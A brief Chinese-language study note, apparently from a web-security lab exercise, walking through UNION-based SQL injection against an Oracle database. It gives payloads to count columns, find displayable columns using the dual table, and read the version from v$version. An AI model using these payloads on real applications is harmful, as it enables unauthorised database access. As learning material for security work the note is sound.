# ①找到列数
```SQL
' ORDER BY 2--
```
##②找到显示位
```SQL
' UNION SELECT 'asdc',NULL-- 
```
发现报错，因为Oracle特殊语法
使用UNION时候需要具体的表,当不知道的时候可医用dual表答题
```SQL
'UNION SELECT 'asdc',NULL FROM dual+--
```
## ③找到Oracle的版本
```SQL
'UNION SELECT banner,NULL FROM v$version+--
```

## 补，关于Oracle中的dual字段
![[Pasted image 20231015222334.png]]